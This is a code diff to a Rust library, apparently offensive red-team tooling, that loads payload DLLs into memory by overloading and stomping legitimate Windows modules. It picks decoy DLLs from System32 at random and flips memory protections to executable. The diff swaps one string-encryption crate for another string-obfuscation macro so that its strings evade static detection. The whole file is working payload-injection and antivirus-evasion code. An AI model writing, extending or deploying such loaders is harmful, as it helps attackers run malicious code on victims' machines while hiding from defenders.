@@ -1,7 +1,4 @@
-#[macro_use]
-extern crate litcrypt2;
-use_litcrypt!();
-
+use obfstr::obfstr;
 use std::{cell::UnsafeCell, env, ffi::c_void, fs, mem::size_of, path::Path, ptr::{self, copy_nonoverlapping}};
 use nanorand::{BufferedRng, Rng, WyRand};
 use windows::Win32::{Foundation::HANDLE, System::SystemServices::IMAGE_BASE_RELOCATION};
@@ -119,8 +116,8 @@ pub fn find_decoy_module (min_size: i64) -> String
     let mut rng = WyRand::new();
     while files.len() > 0
     {
-        let windir = &lc!("WINDIR");
-        let sys32 = &lc!("System32");
+        let windir = obfstr!("WINDIR").to_string();
+        let sys32 = obfstr!("System32").to_string();
         let r = rng.generate_range(0..files.len());
         let windir = std::env::var(windir).unwrap();
         let path =  format!("{}\\{}\\{}", windir, sys32, &files[r]);
@@ -157,11 +154,11 @@ pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<
 {
 
     if !Path::new(payload_path).is_file() {
-        return Err(lc!("[x] Payload file not found."));
+        return Err(obfstr!("[x] Payload file not found.").to_string());
     }
 
 
-    let mut file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
+    let mut file_content = fs::read(payload_path).expect(obfstr!("[x] Error opening the payload file."));
     let result = overload_module(&file_content, decoy_module_path)?;
     let file_content_ptr = file_content.as_mut_ptr();
     
@@ -188,7 +185,7 @@ pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<
 /// use std::fs;
 ///
 /// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
-/// let module = overload::overload_module(payload_content,"");
+/// let module = overload::overload_module(&payload_content,"");
 ///
 /// match module {
 ///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
@@ -201,19 +198,19 @@ pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Resu
     if decoy_module_path != ""
     {
         if !Path::new(&decoy_module_path).is_file() {
-            return Err(lc!("[x] Decoy file not found."));
+            return Err(obfstr!("[x] Decoy file not found.").to_string());
         }
         
-        let decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
+        let decoy_content = fs::read(&decoy_module_path).expect(obfstr!("[x] Error opening the decoy file."));
         if decoy_content.len() < file_content.len() {
-            return Err(lc!("[x] Decoy module is too small to host the payload."));
+            return Err(obfstr!("[x] Decoy module is too small to host the payload.").to_string());
         }
     }
     else
     {
         decoy_module_path = find_decoy_module(file_content.len() as i64);
         if decoy_module_path == "" {
-            return Err(lc!("[x] Failed to find suitable decoy module."));
+            return Err(obfstr!("[x] Failed to find suitable decoy module.").parse().unwrap());
         }
         
     }
@@ -268,7 +265,7 @@ pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMa
         );
 
         if r != 0 {
-            return Err(lc!("[x] Error changing memory protection."));
+            return Err(obfstr!("[x] Error changing memory protection.").parse().unwrap());
         }
         
         dinvoke::rtl_zero_memory(*base_address, region_size);
@@ -306,10 +303,10 @@ pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -
 {
 
     if !Path::new(payload_path).is_file() {
-        return Err(lc!("[x] Payload file not found."));
+        return Err(obfstr!("[x] Payload file not found.").parse().unwrap());
     }
 
-    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
+    let file_content = fs::read(payload_path).expect(obfstr!("[x] Error opening the payload file."));
     let result = managed_overload_module(file_content.clone(), decoy_module_path)?;
 
     Ok(((file_content, result.0), result.1))
@@ -328,7 +325,7 @@ pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -
 /// use std::fs;
 ///
 /// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
-/// let module = overload::overload_module(payload_content,"");
+/// let module = overload::overload_module(&payload_content,"");
 ///
 /// match module {
 ///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
@@ -343,21 +340,21 @@ pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) 
     if decoy_module_path != ""
     {
         if !Path::new(&decoy_module_path).is_file() {
-            return Err(lc!("[x] Decoy file not found."));
+            return Err(obfstr!("[x] Decoy file not found.").parse().unwrap());
         }
         
-        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
+        decoy_content = fs::read(&decoy_module_path).expect(obfstr!("[x] Error opening the decoy file."));
         if decoy_content.len() < file_content.len() {
-            return Err(lc!("[x] Decoy module is too small to host the payload."));
+            return Err(obfstr!("[x] Decoy module is too small to host the payload.").parse().unwrap());
         }
     }
     else
     {
         decoy_module_path = find_decoy_module(file_content.len() as i64);
         if decoy_module_path == "" {
-            return Err(lc!("[x] Failed to find suitable decoy module."));
+            return Err(obfstr!("[x] Failed to find suitable decoy module.").to_string());
         }
-        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));        
+        decoy_content = fs::read(&decoy_module_path).expect(obfstr!("[x] Error opening the decoy file."));        
     }
 
         let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
@@ -443,7 +440,7 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usi
         let size = payload_content.len() as u32;
         if size == 0
         {
-            return Err(lc!("[x] Invalid payload."));
+            return Err(obfstr!("[x] Invalid payload.").to_string());
         }
 
         if stomp_address == 0
@@ -455,7 +452,7 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usi
                     stomp_address = module_base_address + offset as usize;
                 }
                 else {
-                    return Err(lc!("[x] The selected module is not valid to stomp the payload."));
+                    return Err(obfstr!("[x] The selected module is not valid to stomp the payload.").to_string());
                 }
             }
             else {
@@ -463,7 +460,7 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usi
             }
 
             if stomp_address == 0 {
-                return Err(lc!("[x] Failed to find suitable module to stomp to."));
+                return Err(obfstr!("[x] Failed to find suitable module to stomp to.").to_string());
             }
         }
         
@@ -481,7 +478,7 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usi
         );
 
         if ret != 0 {
-            return Err(lc!("[x] Memory read failed."));
+            return Err(obfstr!("[x] Memory read failed.").to_string());
         } 
 
         let base_address: *mut PVOID = std::mem::transmute(&stomp_address_clone);
@@ -492,7 +489,7 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usi
         let ret = dinvoke::nt_protect_virtual_memory(process_handle, base_address, s, PAGE_READWRITE, old_protection);
 
         if ret != 0 {
-            return Err(lc!("[x] Error changing memory permissions."));
+            return Err(obfstr!("[x] Error changing memory permissions.").to_string());
         }
 
         let buffer: *mut c_void = std::mem::transmute(payload_content.as_ptr());
@@ -508,11 +505,11 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usi
         let ret = dinvoke::nt_protect_virtual_memory(process_handle, base_address, s, PAGE_EXECUTE_READ, old_protection);
 
         if ret_write != 0 {
-            return Err(lc!("[x] Payload writing failed."));
+            return Err(obfstr!("[x] Payload writing failed.").to_string());
         }
 
         if ret != 0 {
-            return Err(lc!("[x] Could not restore memory permissions."));
+            return Err(obfstr!("[x] Could not restore memory permissions.").to_string());
         }
 
         Ok((real_content,stomp_address)) 
@@ -551,14 +548,14 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
 {
     unsafe
     {
-        let text_name = &lc!(".text");
+        let text_name = obfstr!(".text").to_string();
         if !Path::new(input_file).is_file() || !Path::new(output_directory).is_dir() {
-            return Err(lc!("[x] Invalid path."));
+            return Err(obfstr!("[x] Invalid path.").to_string());
         }
 
         let mapped_dll = dinvoke::load_library_a(input_file);
         if mapped_dll == 0 {
-            return Err(lc!("[x] Invalid input dll."));
+            return Err(obfstr!("[x] Invalid input dll.").to_string());
         }
 
         let mapped_dll_metadata = manualmap::get_pe_metadata(mapped_dll as _, false).unwrap();
@@ -592,7 +589,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
         let mut tls_callbacks_rvas: Vec<u32> = vec![];
         for section in &mapped_dll_metadata.sections
         {
-           if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
+           if std::str::from_utf8(&section.Name).unwrap().contains(&text_name)
            {
               let text_base_address = mapped_dll as usize + section.VirtualAddress as usize;
               entrypoint_rva = (entry_point as usize - text_base_address) as u32;
@@ -607,14 +604,14 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
            }
         }
   
-        let dll_content = fs::read(input_file).expect(&lc!("[x] Error opening the specified dll."));
+        let dll_content = fs::read(input_file).expect(obfstr!("[x] Error opening the specified dll."));
         
         let dll_content_buffer = dll_content.as_ptr() as _;
         let pe_info = manualmap::get_pe_metadata(dll_content_buffer, false).unwrap();
   
         for section in &pe_info.sections
         {
-            if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
+            if std::str::from_utf8(&section.Name).unwrap().contains(&text_name)
             {
                 let text_base_address: *mut c_void = (dll_content_buffer as usize + section.PointerToRawData as usize) as *mut c_void;
                 let size: usize = section.SizeOfRawData as usize;
@@ -630,7 +627,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
 
                 copy_nonoverlapping(text_base_address as *mut u8, text_content.as_mut_ptr(), size);
                 
-                let payload_path = format!("{}{}",output_directory, lc!("payload.bin"));
+                let payload_path = format!("{}{}",output_directory, obfstr!("payload.bin"));
                 let path: &Path = Path::new(&payload_path);
                 let _ = fs::write(path, &text_content);
 
@@ -649,7 +646,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
                     *tls_callback_addr = callback_template;
                 }
 
-                let template_path = format!("{}{}",output_directory, lc!("template.dll"));
+                let template_path = format!("{}{}",output_directory, obfstr!("template.dll"));
                 let _ = fs::write(&template_path, &dll_content);
                 
                 break;
@@ -695,20 +692,20 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
 {
     unsafe
     {
-        let text_name = &lc!(".text");
+        let text_name = obfstr!(".text").to_string();
         if !Path::new(template_path).is_file() {
-            return Err(lc!("[x] Invalid dll path."));
+            return Err(obfstr!("[x] Invalid dll path.").to_string());
         }
 
         let loaded_dll = dinvoke::load_library_a(template_path);
         if loaded_dll == 0 {
-            return Err(lc!("[x] Error calling LoadLibraryA."));
+            return Err(obfstr!("[x] Error calling LoadLibraryA.").to_string());
         }
 
         let dll_metadata = manualmap::get_pe_metadata(loaded_dll as _, false).unwrap();
         for section in &dll_metadata.sections
         {
-            if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
+            if std::str::from_utf8(&section.Name).unwrap().contains(&text_name)
             {
                 let text_address: *mut c_void = (loaded_dll as usize + section.VirtualAddress as usize) as *mut c_void;
                 let text_sect_ending_addr = loaded_dll as usize + section.VirtualAddress as usize + section.Misc.VirtualSize as usize;
@@ -725,7 +722,7 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
                 if ret != 0
                 {
                     let _ = dinvoke::free_library(loaded_dll as isize);
-                    return Err(lc!("[x] An error ocurred. Dll released."));
+                    return Err(obfstr!("[x] An error ocurred. Dll released.").parse().unwrap());
                 }
 
                 let handle = HANDLE(-1);
@@ -737,7 +734,7 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
                 if ret != 0
                 {
                     let _ = dinvoke::free_library(loaded_dll as isize);
-                    return Err(lc!("[x] An error ocurred. Dll released."));
+                    return Err(obfstr!("[x] An error ocurred. Dll released.").parse().unwrap());
                 }
 
                 relocate_text_section(&dll_metadata, loaded_dll as _, text_address as _,text_sect_ending_addr);
@@ -754,7 +751,7 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
                 if ret != 0
                 {
                     let _ = dinvoke::free_library(loaded_dll as isize);
-                    return Err(lc!("[x] An error ocurred. Dll released."));
+                    return Err(obfstr!("[x] An error ocurred. Dll released.").parse().unwrap());
                 }
 
                 return Ok((dll_metadata,loaded_dll));
